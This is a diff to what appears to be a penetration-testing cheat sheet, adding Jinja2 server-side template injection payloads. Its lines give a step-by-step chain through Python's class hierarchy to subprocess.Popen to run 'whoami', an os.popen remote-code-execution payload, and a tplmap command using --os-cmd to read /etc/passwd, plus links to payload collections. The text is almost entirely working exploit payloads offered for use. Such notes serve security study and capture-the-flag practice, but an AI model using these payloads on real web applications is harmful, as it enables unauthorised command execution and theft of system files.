@@ -125,6 +125,23 @@ LFI
 RCE
 {{config.__class__.__init__.__globals__['os'].popen(<command>).read()}}
 ```
+
+```
+{{ ''.__class__ }}
+{{ ''.__class__.__mro__ }}
+{{ ''.__class__.__mro__[1] }}
+{{ ''.__class__.__mro__[1].__subclasses__() }}
+
+find the index position of subprocess.Popen
+
+{{ ''.__class__.__mro__[1].__subclasses__()[401] }}
+{{ ''.__class__.__mro__[1].__subclasses__()[401]("whoami", shell=True, stdout=-1).communicate() }}
+```
+
+https://github.com/swisskyrepo/PayloadsAllTheThings
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
+
+
 https://github.com/epinna/tplmap
 ```
 ./tplmap.py -u http://10.10.10.10:5000/ -d 'noot' --os-cmd "cat/ etc/passwd"
